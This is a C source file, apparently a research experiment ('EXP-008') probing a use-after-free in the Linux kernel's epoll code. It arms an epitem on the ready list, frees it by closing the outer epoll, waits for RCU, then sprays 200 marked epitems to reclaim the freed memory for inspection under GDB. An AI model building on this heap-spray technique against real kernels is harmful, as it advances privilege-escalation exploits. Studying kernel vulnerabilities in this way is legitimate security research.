/*
 * EXP-008: Timing test with event-armed epitem
 *
 * Key difference from test_epoll_spray.c: we TRIGGER an event on
 * inner_epoll before closing outer_epoll, ensuring the epitem is
 * on the ready list (rdllink is linked) when __ep_remove runs.
 * This ensures list_del_init(&epi->rdllink) actually executes.
 *
 * Strategy:
 * 1. Create outer_epoll watching inner_epoll
 * 2. Create a pipe and add it to inner_epoll
 * 3. Write to the pipe → inner_epoll becomes readable
 * 4. This makes inner_epoll's epitem appear on outer_epoll's rdllist
 * 5. Close outer_epoll → __ep_remove → list_del_init fires
 * 6. Wait for RCU grace period
 * 7. Spray new epitems
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <sys/mount.h>
#include <string.h>
#include <errno.h>

#define SPRAY_COUNT 200

int main(void) {
    int outer_epoll, inner_epoll;
    int spray_epolls[SPRAY_COUNT];
    int spray_pipes[SPRAY_COUNT][2];
    int event_pipe[2];
    struct epoll_event ev;

    /* Mount essential filesystems */
    mount("proc", "/proc", "proc", 0, NULL);
    mount("sysfs", "/sys", "sysfs", 0, NULL);
    mount("devtmpfs", "/dev", "devtmpfs", 0, NULL);

    printf("[*] EXP-008: Timing test with event-armed epitem\n");

    /* Pre-allocate spray resources */
    for (int i = 0; i < SPRAY_COUNT; i++) {
        spray_epolls[i] = epoll_create1(0);
        if (spray_epolls[i] < 0) {
            perror("epoll_create1 spray");
            return 1;
        }
        if (pipe(spray_pipes[i]) < 0) {
            perror("pipe spray");
            return 1;
        }
    }

    /* Phase 1: Create victim topology */
    outer_epoll = epoll_create1(0);
    inner_epoll = epoll_create1(0);

    /* Create a pipe and add it to inner_epoll */
    if (pipe(event_pipe) < 0) {
        perror("pipe event");
        return 1;
    }
    ev.events = EPOLLIN;
    ev.data.fd = event_pipe[0];
    if (epoll_ctl(inner_epoll, EPOLL_CTL_ADD, event_pipe[0], &ev) < 0) {
        perror("epoll_ctl inner");
        return 1;
    }

    /* Add inner_epoll to outer_epoll */
    ev.events = EPOLLIN;
    ev.data.fd = inner_epoll;
    epoll_ctl(outer_epoll, EPOLL_CTL_ADD, inner_epoll, &ev);
    printf("[*] Topology: outer_epoll(%d) -> inner_epoll(%d) -> pipe\n",
           outer_epoll, inner_epoll);

    /* Phase 2: ARM the event — write to pipe so inner_epoll becomes readable */
    printf("[*] Phase 2: Arming event (writing to pipe)...\n");
    char buf = 'X';
    write(event_pipe[1], &buf, 1);

    /* Do an epoll_wait on outer_epoll to pull the epitem onto rdllist */
    struct epoll_event ready_events[4];
    int nfds = epoll_wait(outer_epoll, ready_events, 4, 0);
    printf("[*] epoll_wait returned %d events (epitem is now on rdllist)\n", nfds);

    /* Phase 3: Close outer_epoll — this triggers __ep_remove with
     * the epitem ON the ready list, causing list_del_init to fire */
    printf("[*] Phase 3: Closing outer_epoll (list_del_init should fire)...\n");
    close(outer_epoll);
    printf("[*] outer_epoll closed. epitem freed via kfree_rcu.\n");

    /* Phase 4: Wait for RCU grace period */
    printf("[*] Phase 4: Waiting 500ms for RCU grace period...\n");
    usleep(500000);

    /* Phase 5: Spray new epitems */
    printf("[*] Phase 5: Spraying %d new epitems...\n", SPRAY_COUNT);
    ev.events = EPOLLIN;
    for (int i = 0; i < SPRAY_COUNT; i++) {
        ev.data.u64 = 0xdeadbeefc0de0000ULL | i;
        if (epoll_ctl(spray_epolls[i], EPOLL_CTL_ADD, spray_pipes[i][0], &ev) < 0) {
            printf("[!] epoll_ctl spray %d failed: %s\n", i, strerror(errno));
        }
    }
    printf("[*] Spray complete.\n");

    /* Phase 6: Signal GDB that experiment is done */
    printf("[*] Phase 6: Experiment complete. Sleeping for analysis...\n");
    while (1) sleep(3600);
    return 0;
}
